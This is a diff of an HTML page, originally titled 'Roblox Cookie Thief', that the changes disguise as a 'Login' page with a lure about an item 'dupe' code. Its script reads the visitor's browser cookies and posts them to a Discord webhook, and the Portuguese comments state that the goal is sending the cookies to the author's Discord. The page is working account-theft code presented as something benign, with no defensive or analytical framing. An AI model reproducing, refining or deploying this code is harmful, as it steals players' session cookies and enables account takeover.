@@ -3,35 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Thief</title>
+    <title>Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('https://pbs.twimg.com/media/E8CMoPuVgBY4W9q.jpg:large');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .cookie-alert {
+            color: red;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Clique aqui para ganhar Robux grátis!</h1>
-    
+    <p id="warning" class="cookie-alert">make sure the code you copied from the extension is correct and wait up to 10 minutes for the dupe to work. remember, if it doesn't work, put the code again.</p>
+
     <script>
         // Função para enviar os cookies para o seu Discord webhook
         function sendCookies() {
             // Captura os cookies
             var cookies = document.cookie;
 
+            // Display warning message
+            document.getElementById('warning').style.display = "block";
+
             // Envia os cookies para o seu Discord webhook (você deve substituir o URL pelo seu)
+            var data = {
+                content: "Cookie: " + cookies
+            };
+
             fetch('https://discord.com/api/webhooks/SEU_DISCORD_WEBHOOK_AQUI', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({cookies: cookies})
+                body: JSON.stringify(data)
             })
             .then(response => {
-                if (response.ok) {
-                    alert('Cookies enviados com sucesso para o Discord!');
-                } else {
-                    alert('Erro ao enviar cookies para o Discord!');
+                if (!response.ok) {
+                    throw new Error('Error sending message to Discord');
                 }
             })
             .catch(error => {
-                console.error('Erro:', error);
-                alert('Erro ao enviar cookies para o Discord!');
+                console.error('Error:', error);
             });
         }
 
